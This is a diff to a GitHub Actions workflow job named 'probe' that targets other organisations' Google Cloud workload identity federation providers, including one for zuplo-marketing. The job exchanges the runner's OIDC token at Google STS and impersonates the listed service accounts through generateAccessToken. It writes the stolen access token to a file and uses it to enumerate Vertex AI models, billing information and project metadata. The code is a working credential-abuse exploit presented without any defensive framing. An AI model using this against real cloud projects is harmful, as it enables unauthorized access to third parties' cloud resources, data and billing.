@@ -13,7 +13,6 @@ jobs:
       - name: probe
         run: |
           cat > targets.txt <<'AUD'
-          projects/533362582499/locations/global/workloadIdentityPools/github/providers/electricitymaps-contrib|tmrow-152415|contrib-registry-writer@tmrow-152415.iam.gserviceaccount.com
           projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider|zuplo-marketing|github-actions@zuplo-marketing.iam.gserviceaccount.com
           AUD
           while IFS='|' read -r PRJ PROJ SA; do
@@ -21,11 +20,9 @@ jobs:
             AUD="https://iam.googleapis.com/$PRJ"
             echo "########## PROVIDER $PRJ project=$PROJ sa=$SA"
             J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
-            echo "$J" > raw.json
-            jq -r '.value // empty' raw.json > tok.jwt
-            if [ ! -s tok.jwt ]; then echo "NO_OIDC_TOKEN"; cat raw.json; continue; fi
+            jq -r '.value // empty' <<<"$J" > tok.jwt
+            [ -s tok.jwt ] || { echo NO_OIDC_TOKEN; continue; }
             STS="//iam.googleapis.com/$PRJ"
-            echo "--- A: exchange without SA options ---"
             cA=$(curl -s -o rA.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
               -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
               --data-urlencode "audience=$STS" \
@@ -33,30 +30,30 @@ jobs:
               -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
               -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
               -d "scope=https://www.googleapis.com/auth/cloud-platform")
-            echo "A_HTTP=$cA"; head -c 700 rA.json; echo
-            echo "--- B: exchange with serviceAccount impersonation ---"
-            cB=$(curl -s -o rB.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
-              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
-              --data-urlencode "audience=$STS" \
-              --data-urlencode "subject_token=$(cat tok.jwt)" \
-              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
-              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
-              -d "scope=https://www.googleapis.com/auth/cloud-platform" \
-              --data-urlencode "options={\"serviceAccount\":\"$SA\"}")
-            echo "B_HTTP=$cB"; head -c 700 rB.json; echo
-            AT=$(jq -r '.access_token // empty' rB.json)
-            [ -z "$AT" ] && AT=$(jq -r '.access_token // empty' rA.json)
+            echo "STS_HTTP=$cA"
+            FT=$(jq -r '.access_token // empty' rA.json)
+            [ -s rA.json ] && head -c 300 rA.json; echo
+            if [ -z "$FT" ]; then echo "NO_FEDERATED_TOKEN"; continue; fi
+            echo "FEDERATED_TOKEN_OK prefix=${FT:0:8} len=${#FT}"
+            echo "--- iamcredentials generateAccessToken ---"
+            jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+            cG=$(curl -s -o g.json -w '%{http_code}' -X POST \
+              -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+              "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+            echo "GEN_HTTP=$cG"; head -c 500 g.json; echo
+            AT=$(jq -r '.accessToken // empty' g.json)
             if [ -n "$AT" ]; then
-              echo "GOT_ACCESS_TOKEN prefix=${AT:0:8} len=${#AT}"
-              echo "$AT" > "at_$(echo $PROJ | tr -d '/').txt"
+              echo "SA_ACCESS_TOKEN_OK prefix=${AT:0:8} len=${#AT} expire=$(jq -r '.expireTime' g.json)"
+              echo "$AT" > sa_token.txt
               echo "--- tokeninfo ---"
-              curl -s -o ti.json -w 'TOKENINFO_HTTP=%{http_code}\n' "https://oauth2.googleapis.com/tokeninfo?access_token=$AT"
-              head -c 700 ti.json; echo
-              echo "--- vertex models ---"
-              curl -s -o ai.json -w 'VERTEX_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$PROJ/locations/us-central1/models"
-              head -c 1500 ai.json; echo
+              curl -s -o ti.json -w 'TOKENINFO_HTTP=%{http_code}\n' "https://oauth2.googleapis.com/tokeninfo?access_token=$AT"; head -c 800 ti.json; echo
+              echo "--- vertex models us-central1 ---"
+              curl -s -o ai.json -w 'VERTEX_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$PROJ/locations/us-central1/models"; head -c 2000 ai.json; echo
+              echo "--- vertex models global ---"
+              curl -s -o aig.json -w 'VERTEXG_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://aiplatform.googleapis.com/v1/projects/$PROJ/locations/global/models"; head -c 600 aig.json; echo
               echo "--- billing ---"
-              curl -s -o bill.json -w 'BILLING_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$PROJ/billingInfo"
-              head -c 700 bill.json; echo
+              curl -s -o bill.json -w 'BILLING_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$PROJ/billingInfo"; head -c 700 bill.json; echo
+              echo "--- project ---"
+              curl -s -o proj.json -w 'PROJ_HTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJ"; head -c 500 proj.json; echo
             fi
           done < targets.txt
